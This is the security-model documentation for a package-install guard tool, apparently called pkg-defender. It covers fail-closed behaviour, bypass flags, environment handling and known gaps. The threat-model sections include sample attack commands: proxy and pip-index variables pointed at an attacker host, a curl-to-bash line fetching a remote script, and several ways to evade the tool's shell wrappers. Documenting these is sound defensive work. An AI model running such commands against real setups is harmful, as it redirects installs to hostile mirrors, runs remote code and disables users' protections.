# Security Model

This document explains pkg-defender's security model — how it protects package
installations, what boundaries exist, and what its known limitations are.

## Fail-Closed Design

pkg-defender implements a **fail-closed** security model: any failure in the
threat verification process results in the package installation being **blocked**
rather than allowed to proceed.

```
FAIL-OPEN (insecure):
  If verification fails → ALLOW installation ❌

FAIL-CLOSED (secure):
  If verification fails → BLOCK installation ✓
```

With fail-closed design, when pkgd cannot verify a package (due to errors,
timeouts, crashes, or any other failure), the default behavior is to **block**
the installation rather than risk allowing a potentially malicious package
through.

### Exit Code Reference

| Exit Code | Meaning                                         | Action                 |
| --------- | ----------------------------------------------- | ---------------------- |
| **0**     | All checks passed                               | **ALLOW** installation |
| **1**     | General error (timeout, unknown manager, etc)   | **BLOCK** installation |
| **2**     | Invalid arguments or usage error                | **BLOCK** installation |
| **3**     | Package version is in cooldown period           | **BLOCK** installation |
| **4**     | Threat or vulnerability detected                | **BLOCK** installation |
| **5**     | Registry or network unreachable                 | **BLOCK** installation |
| **6**     | Configuration error                             | **BLOCK** installation |
| **7**     | Database error (stale, missing, or corrupt)     | **BLOCK** installation |
| **8**     | Setup completed with warnings (partial failure) | **BLOCK** installation |
| **130**   | Interrupted by SIGINT                           | **BLOCK** installation |
| Any other | Unexpected behavior                             | **BLOCK** installation |

### Timeout Behavior

The command wrapper enforces a default 30-second timeout on package verification
(configurable via `command_timeout_seconds`):

```text
[PKGD] Error: Pre-install check timed out after 30 seconds
```

**Why 30 seconds (default):**
- Long enough for database queries against local threat database
- Short enough to prevent pkgd from being a denial-of-service vector
- Prevents indefinite hangs in CI/CD pipelines

### Failure Scenarios

**Pre-install check times out:**
```text
[PKGD] Error: Pre-install check timed out after 30 seconds
```

*Exits with code 1 (general error). The timeout is configurable via
`command_timeout_seconds` in the config file.*

**Timeout error:**
If pkgd encounters an unexpected error during threat verification, the check
fails closed — the installation is blocked. The `--explain` flag provides
detailed diagnostic information:

```text
[PKGD] ── Decision Trace ──────────────────────────────────────
[PKGD] Package:     (unknown)
[PKGD] Decision:    ❌ ERROR
[PKGD] Reason:      Pre-install check timed out
[PKGD] ── Check Details ───────────────────────────────────────
[PKGD] Timeout: 30 seconds
[PKGD] ── What you can do ─────────────────────────────────────
[PKGD] • Retry the command
[PKGD] • Increase timeout in config: command_timeout_seconds
[PKGD] • Check network connectivity and database health
```

*There is no separate handling for "pkgd binary not found" or "binary integrity
check failed" — those concepts belong to the removed shell-hook architecture.*

### User Override Options

**Option 1 — Bypass with Reason:**
```bash
pkgd bypass <package@version> --reason "verified safe - approved by security team"
```
Bypasses are stored locally and persist across terminal sessions.

**Option 2 — Bypass Cooldown:**
```bash
pkgd pip install requests==2.30.0 --bypass-cooldown
```

*Cooldown bypasses are logged to the audit trail. The `--bypass-cooldown` flag
is a one-time override per command invocation. To disable cooldown enforcement
entirely, set `cooldown.enabled = false` in the config — but note this will
raise a protection warning in `pkgd health` output. The default is `true`.*

**Option 3 — Bypass with Version:**
```bash
# Bypass a specific version
pkgd bypass express@4.18.2 --reason "trusted in our environment"

# Expiring bypass
pkgd bypass express@4.18.2 --reason "temporary dev work" --expires 24h
```

*Bypasses always require an `@version` specifier — global per-package bypass
without a version is not supported.*

**Option 4 — Audit-Only Mode:**
```bash
pkgd -q npm install express
```

*The `-q` / `--quiet` flag suppresses block/allow output while still performing
full threat checks. Audit events are always logged to the database regardless
of quiet mode. Place `-q` **before** the manager name so it is consumed by pkgd
rather than passed through to the package manager.*

### Fail-Closed in CI/CD

For pipeline gating, use the `--fail-on-threat` flag:
```bash
pkgd audit . --fail-on-threat
```

This differs from fail-closed:
- **Fail-closed:** Any pkgd failure → block
- **Fail-on-threat:** Only CRITICAL/HIGH threats → block, other failures → allow

| Property                    | Guarantee            |
| --------------------------- | -------------------- |
| On pkgd crash               | Installation blocked |
| On pkgd timeout             | Installation blocked |
| On pkgd not found           | Installation blocked |
| On binary integrity failure | Installation blocked |
| On unknown exit code        | Installation blocked |

## Binary Integrity

pkg-defender currently does **not** perform binary integrity verification. The
command wrapper hands off execution directly to the package manager binary via
`os.execvp()` in `exec_cleared_command()` (`src/pkg_defender/cli/exec.py`) without any verification of
the binary.

```python
# src/pkg_defender/cli/exec.py — exec_cleared_command()
os.execvp(exec_args[0], exec_args)
```

This means:
- No inode verification is performed
- No SHA256 hash verification is performed
- No symlink swap detection is performed
- The binary is executed as-is from the system PATH

### Threat Model

**Attack Vector: Binary Replacement** — An attacker with write access to
directories in the system PATH could replace the package manager binary with a
malicious version, and the command wrapper would execute it without detection.

**Current Mitigation:** None at the binary level. Users must rely on:
- Operating system security (file permissions, code signing)
- Filesystem integrity monitoring (e.g., Tripwire, AIDE)
- Package manager integrity checks

### Historical Context

Previous versions of pkg-defender (the now-removed shell hook architecture)
included binary integrity verification features. These were removed before
release as part of the transition to the current command wrapper architecture.
No artifacts of the removed verification system remain in the source code.

### Manual Verification

Users concerned about binary integrity can perform manual verification:

```bash
# Find package manager binary location
which npm
which pip

# Check file integrity using system tools
# Linux:
sha256sum "$(which npm)"
# macOS:
shasum -a 256 "$(which npm)"

# Check package manager package integrity (if supported)
npm config get package-lock
pip check
```

### Future Possibilities

Binary integrity verification may be re-added in future releases by
implementing verification in the Python command wrapper before
`os.execvp()`, using allowed binary hashes from configuration, or
implementing an allowlist of known-good binary paths.

## Environment Handling

pkg-defender's command wrappers use `os.execvp()` to hand off to native package
managers, which **preserves the current environment** without sanitization.

```python
# From src/pkg_defender/cli/exec.py — exec_cleared_command()
os.execvp(exec_args[0], exec_args)
```

This means:
- **All current environment variables are preserved**
- **No `env -i` sanitization**
- **Package manager tools see the same environment** as if pkgd was not involved

### Variables That Are Preserved

| Variable Category      | Examples                                | Impact                              |
| ---------------------- | --------------------------------------- | ----------------------------------- |
| **PATH**               | `/usr/local/bin:/usr/bin:/bin`          | Package manager location lookup     |
| **Home directory**     | `HOME`, `USER`                          | Config file locations               |
| **Locale**             | `LANG`, `LC_*`                          | Localization settings               |
| **Proxy settings**     | `HTTP_PROXY`, `HTTPS_PROXY`, `NO_PROXY` | Network access                      |
| **Package mgr config** | `NPM_CONFIG_*`, `PIP_*`                 | Tool-specific settings              |
| **pkgd config**        | `PKGD_*`                                | pkgd configuration (before handoff) |

The current implementation does **not** filter, clear, whitelist, or blacklist
any environment variables. No `env -i` sanitization is performed.

### Why Full Environment Preservation Was Chosen

Full environment preservation is a deliberate design choice for the
command-wrapper architecture:

- **Simpler implementation** — No need to maintain whitelist/blacklist
- **No breakage** — Package managers work exactly as users expect
- **User control** — Users can set proxy, config, and other variables as needed

| Aspect                | Benefit                        | Risk                                     |
| --------------------- | ------------------------------ | ---------------------------------------- |
| No `env -i`           | Package managers work normally | Environment variables can be manipulated |
| Full env preservation | No configuration headaches     | Proxy/config injection possible          |
| Simple design         | Less code, fewer bugs          | Fewer security boundaries                |

### Attack Vectors

**Vector 1 — Proxy Injection:**
```bash
# Attacker sets HTTP_PROXY to redirect package downloads
export HTTP_PROXY=http://attacker.com:8080
pkgd npm install express  # Downloads from attacker's proxy
```
`HTTP_PROXY` is preserved and could affect package downloads.

**Vector 2 — npm Configuration Injection:**
```bash
# Attacker sets npm to run scripts on install
export npm_config_ignore_scripts=false
export npm_config_scripts_prepend_node_path=true
pkgd npm install malicious-package  # Runs attacker's postinstall
```
`NPM_CONFIG_*` variables are preserved and affect npm behavior.

**Vector 3 — pip Configuration Injection:**
```bash
# Attacker sets pip to use index-url pointing to malicious PyPI
export PIP_INDEX_URL=http://attacker.com/simple
pkgd pip install requests  # Downloads from attacker's mirror
```
`PIP_*` variables are preserved and affect pip behavior.

**Vector 4 — Config File Manipulation:**
```bash
# Attacker sets fail_on_threat_enabled=false to disable threat blocking
pkgd config set fail_on_threat_enabled false --global
pkgd npm install malicious-package  # Threat checks still run but don't block
```

`PKGD_*` environment variables exist for several weakening settings (see
[environment-variables.md](../reference/environment-variables.md)), but there
is no single `PKGD_BYPASS_ALL` that disables all protection. Attackers who
gain write access to the config file or environment could disable individual
protections. The daemon can alert on weakening events if configured to monitor
configuration changes.

### Architecture Note

The current command-wrapper architecture uses Python's `os.execvp()` to
hand off to the package manager. Key properties:

| Aspect               | Current Behavior                     |
| -------------------- | ------------------------------------ |
| Environment handling | Full environment preserved           |
| Variable filtering   | No filtering                         |
| Security boundary    | Threat DB check before `os.execvp()` |
| Implementation       | `os.execvp(exec_args[0], exec_args)` |

### Security Properties

| Property                 | Guarantee                               |
| ------------------------ | --------------------------------------- |
| No env sanitization      | Environment fully preserved             |
| Threat check before exec | Package checked before handoff          |
| Process replacement      | Python ends, PM runs directly           |
| No proxy/conf filtering  | User responsible for environment safety |

The current architecture assumes: **(1)** the threat database is local with no
network I/O at install time; **(2)** threat checks happen before handoff
(`os.execvp()` is only called if checks pass); **(3)** the environment is
trusted with no sanitization performed.

## Known Limitations

### Shell Function Overriding

The generated shell functions can be overridden by later function or alias
definitions. This is the **easiest way to bypass pkg-defender** and requires
only user-level access (no root needed):

```bash
# Add to ~/.zshrc AFTER the pkg-defender function definition:
npm() { command npm "$@"; }   # Redefines the function to bypass pkgd
# OR (alias takes precedence over functions in bash/zsh)
alias npm="npm"               # Overrides the pkgd function
```

This completely bypasses all security checks. Users **must**:
1. Ensure pkgd shell functions are defined **after** any other function/alias definitions
2. Run `pkgd health --verbose` regularly
3. Verify shell functions are active after RC file changes

If another tool or configuration defines functions or aliases with the same
names after the pkg-defender functions, they take precedence:

```bash
# ~/.zshrc

# ... earlier in the file ...
npm() {                      # pkgd shell function
    case "$1" in
        install|remove|...)
            pkgd npm "$@"
            ;;
        *)
            command npm "$@"
            ;;
    esac
}

# ... later in the file ...
alias npm="npm"              # This OVERRIDES pkgd, bypassing security!
```

**Mitigation:** Place pkgd shell functions at the **end** of the RC file (after any
other function or alias definitions). Run
`pkgd health --verbose` after any RC file changes to verify functions are active.

**Detection:**
```bash
# Check if npm resolves through pkgd
type npm
# Should show: npm is a function
# If it shows: npm is /path/to/npm, it has been bypassed

# Check function definition
which npm
# Should show the case/switch function body

# Run verification
pkgd health --verbose
```

### curl | bash Installation

The "curl | bash" pattern **cannot** be intercepted:

```bash
# This bypasses ALL hooks
curl -s https://install.malicious.com/install.sh | bash
```

This is not a package manager command — it is a shell script download and
execution.

**Mitigation:** Audit shell scripts before running, use `curl --dry-run` to
preview, and prefer explicit package manager commands like `npm install` or
`pip install`.

### Direct Binary Invocation

The command wrappers work by intercepting commands through shell functions.
Calling via full path or explicit interpreter invocation avoids function
interception:

```bash
# These bypass shell functions:
/usr/bin/npm install express
/usr/local/bin/pip install requests
/bin/bash -c "npm install express"
```

**Mitigation:** Ensure shell functions are defined correctly and educate users to avoid
calling binaries directly.

### Subshell, Background, and Subprocess Invocations

Shell functions are inherited by subshells and background jobs (bash, zsh, fish),
so `(npm install express)` and `npm install express &` are still intercepted.
However, explicit subprocess invocation via `sh -c` bypasses function interception:

```bash
# These ARE intercepted (function inherited in subshell/bg):
(npm install express)          # Subshell — covered
npm install express &         # Background — covered

# This BYPASSES interception (explicit subprocess):
sh -c "npm install express"   # Subprocess — not covered
```

**Mitigation:** Avoid `sh -c` patterns for security-critical installs. Run
commands directly in the interactive shell or in shell scripts that source
the RC file with function definitions.

### RC File Ordering

Shell function definitions depend on RC file sourcing order. If multiple RC files are
sourced or shell configuration is complex, later function or alias
definitions can override the pkgd functions:

```bash
# In ~/.zshrc:
source ~/.zshrc.d/*.zsh  # Sources files in alphabetical order

# If pkgd functions are defined in an alphabetically earlier file
# (e.g., `10-pkgd.zsh`), later files (e.g., `99-custom.zsh`)
# can define functions or aliases with the same name that override pkgd
```

**Mitigation:** Check RC file sourcing order, place pkgd shell functions at the end of
the main RC file, and verify with `pkgd health --verbose` after any RC changes.

### Package Manager Limitations

**Indirect Dependencies:** pkg-defender checks the **direct** package being
installed, not its transitive dependencies.

```bash
# This checks 'evil' but NOT its dependencies:
npm install evil
# If 'evil' depends on 'malicious', that is not checked
```

*Mitigation:* Use `pkgd audit` on lock files to catch transitive threats.

**Version Specification:** When a version is not specified explicitly, pkgd
checks whichever version resolves from the project's package.json or lock file.

*Mitigation:* Always specify versions in package.json or lock files.

### Environment-Specific Limitations

**Non-Interactive Shell Scripts:** Shell functions may not be active in
non-interactive shell scripts because bash and zsh do not source RC files
(`~/.bashrc`, `~/.zshrc`) by default when invoked non-interactively:

```bash
#!/bin/bash
# This script may NOT have pkgd shell functions active
npm install express
```

*Mitigation:* Source the function definitions manually in the script, or invoke
the shell interactively (`bash -i`).

### Not a Silver Bullet

pkg-defender provides defense-in-depth but cannot prevent all attack vectors:

| Attack Vector                         | Protection                                   |
| ------------------------------------- | -------------------------------------------- |
| Zero-day vulnerabilities              | Partial (depends on OSV/GHSA updates)        |
| Malicious packages with no known CVEs | None (requires threat feed coverage)         |
| Supply chain attacks on registries    | None (registry compromise is outside scope)  |
| Social engineering                    | None (human factor)                          |
| Insider threats                       | Partial (auditing helps, but not prevention) |
| Compromised CI/CD                     | None (use separate security tools)           |

### Scoring Model Confidence

The threat scoring model is a **heuristic system**, not an empirically validated
risk assessment tool. This has direct implications for the security model:

**What this means for security decisions:**

- The model ranks threats *relative to each other* within a single evaluation.
  Scores do not represent probability of exploitation or likelihood of harm.
- All scoring parameters (source weights, severity mappings, corroboration
  multipliers, decay rates, block threshold) are developer-assigned defaults.
  No false positive or false negative rates have been measured.
- The block threshold (`BLOCK_SCORE_THRESHOLD = 0.3`) was chosen to prevent
  social feeds from blocking installs — not to optimize the precision/recall
  tradeoff for legitimate threats.

**What remains reliable:**

- **Social feeds cannot block installs.** This is a structural guarantee
  (confidence cap + threshold), not an empirical claim.
- **Higher-confidence sources produce higher scores.** The ranking direction
  is correct by design.
- **Fail-closed defaults hold.** Unknown inputs produce non-zero scores that
  err toward blocking.

**What is not reliable:**

- Specific score values as absolute risk indicators
- Cross-package or cross-ecosystem score comparisons
- The assumption that the current threshold optimizes the false positive/negative
  tradeoff

For full details on scoring parameters and their validation status, see
[scoring-formula.md](../reference/scoring-formula.md#limitations-and-known-caveats)
and [scoring.md](scoring.md#transparency-model-validation-status).

### Deployment Best Practices

**For security-conscious organizations:**
1. Place shell functions at end of RC files — verify with `pkgd health --verbose`
2. Use strict cooldown periods — default to 1+ days
3. Enable all threat feeds — OSV, GHSA, Socket.dev
4. Run daemon for fresh data — keep threat database current
5. Audit lock files regularly — use `pkgd audit` in CI/CD
6. Monitor audit logs — review bypass events in the database
7. Use bypasses sparingly — document all bypasses

**For high-security environments:**
1. Deploy in block-only mode — no bypasses, no quiet mode
2. Use readonly RC files — after shell function placement, make RC files readonly
3. Separate user environments — do not mix dev/prod on the same account
4. Integrate with SIEM — forward audit events to security systems
5. Regular penetration testing — test shell function integrity

### Input Validation (SSRF Prevention)

All user-supplied package names are validated against ecosystem-specific
regexes before URL construction:

- **Homebrew:** `BREW_PKG_RE` (`^[a-zA-Z0-9._-]+(?:@[^\s]+)?$`)
- API response fields (`ruby_source_path`, `tap`) are validated before use
  in GitHub API calls
- Tap whitelist restricts GitHub API calls to known Homebrew repositories

All HTTP requests made through `fetch_json()` are validated against a
hardcoded per-manager domain allowlist (`REGISTRY_ALLOWLIST` in
`registry_domains.py`). When a `manager` parameter is provided, the
request URL's domain must appear in that manager's allowlist or a
`SecurityError` is raised before the request is made. This prevents
server-side request forgery (SSRF) attacks where crafted package names
or malicious redirects could direct requests to internal services.

The `TimestampResolver` (which fetches from `api.github.com` and
`libraries.io`) also validates domains via the same allowlist.

## Package Manager Coverage

pkg-defender hooks package manager commands across multiple ecosystems. The
following tables summarize coverage; the full command matrix is available in
[docs/reference/package-managers.md](../reference/package-managers.md).

### Ecosystem Mapping

| Shell Command       | Mapped Ecosystem | Database          |
| ------------------- | ---------------- | ----------------- |
| npm, yarn, pnpm     | npm              | npm threats       |
| pip, pip3, pipx, uv | pip              | PyPI threats      |
| brew                | homebrew         | homebrew threats  |
| apt, yum, dnf       | apt/yum/dnf      | OSV (generic)     |
| gem                 | rubygems         | RubyGems threats  |
| cargo               | cargo            | Cargo (OSV)       |
| conda               | conda            | Conda-forge feeds |

*Note: Conda CLI interception is now active. The `CondaUnifiedAdapter` is
registered in the unified manager registry with full coverage support.*

### Commands Not Covered

| Pattern      | Example                           | Why Not Covered                                 |
| ------------ | --------------------------------- | ----------------------------------------------- |
| curl \| bash | `curl https://install.sh \| bash` | Not a package manager command                   |
| Direct path  | `/usr/bin/npm install`            | Calls binary directly, not via function wrapper |
| Subshell     | `(npm install)`                   | Covered by function inheritance                 |
| Background   | `npm install &`                   | Covered by function inheritance                 |

### Additional Gaps

| Command                | Coverage Status                                                            |
| ---------------------- | -------------------------------------------------------------------------- |
| `yarn` (no subcommand) | **Covered** — routes to SYNC intent with empty packages                    |
| `uv run [script]`      | **Covered** — routes to EXECUTE intent, full pre-install checks run        |
| `python3.11 -m pip`    | **Not covered** — no `python`/`python3` CLI manager exists; use `pkgd pip` |

## Secure Design Principles

pkg-defender follows established secure design principles throughout its architecture. Each principle is demonstrated by specific implementation decisions documented in this file.

### Fail-Closed

The cooldown engine defaults to **fail-closed**: if a threat cannot be evaluated (e.g., feed unreachable, database corrupted, configuration invalid), the system denies the package by default rather than allowing it. This is the safer default for a security tool. See [Fail-Closed Guarantee](#fail-closed-design) (lines 8–144).

### Least Privilege

Command execution wrappers pass through only explicitly allowed arguments. The tool does not execute arbitrary shell commands or evaluate untrusted input as code. Registry adapters are isolated per package manager, and each adapter has only the permissions necessary for its function.

### Defense in Depth

Threat detection operates at multiple independent layers:
- **Multiple intelligence feeds** — each threat is cross-referenced against OSV, npm audit, and other feed adapters
- **Cooldown + blocking** — threats are first assessed (cooldown), then blocked if confirmed
- **Bypass requires reason** — bypassing a block requires explicit justification, creating an audit trail

See [Cooldown Engine](#fail-closed-design) and [Threat Intelligence](#scoring-model-confidence).

### Secure Defaults

All security features default to the most conservative settings:
- Cooldown is enabled by default
- Bypass requires a documented reason
- Cache timeout defaults to 30 seconds (short window for stale data)
- No registry adapters are excluded by default

### Input Validation

Domain allowlists prevent SSRF attacks by restricting outbound connections to known threat intelligence feed endpoints. See [Input Validation (SSRF Prevention)](#input-validation-ssrf-prevention) (lines 549–568).


## Threat Model Summary

pkg-defender's security model rests on these boundaries:

1. **Verification before execution** — All threat checks complete before
   `os.execvp()` hands off to the package manager. If checks fail, execution is
   blocked.
2. **Fail-closed by default** — Any error, timeout, or unexpected condition
   during verification results in a block.
3. **No environment sanitization** — The current architecture trusts the
   environment and places responsibility on the user for proxy, config, and
   other variable safety.
4. **No binary integrity verification** — Package manager binaries are executed
   as-is from the system PATH; users must rely on OS-level protections.
5. **Function-based interception** — Wrapping uses shell function definitions,
   which can be bypassed by function or alias overriding, direct binary invocation, or
   explicit subprocess invocation (`sh -c`).
6. **Direct dependency checking** — Only the explicitly requested package is
   verified; transitive dependencies are not checked at install time.
7. **Minimal network I/O** — The threat database is local, but automatic
   database refresh (`_ensure_db_fresh`) and version timestamp caching
   (`_cache_version_timestamps_async`) may perform network I/O during
   installation verification if the database is stale.

The model assumes that the local environment is trusted, that users will follow
deployment best practices (especially RC file ordering), and that the threat
database is kept current. For environments requiring stronger guarantees —
binary integrity verification, environment sanitization, or transitive
dependency scanning — additional tooling should be layered on top.
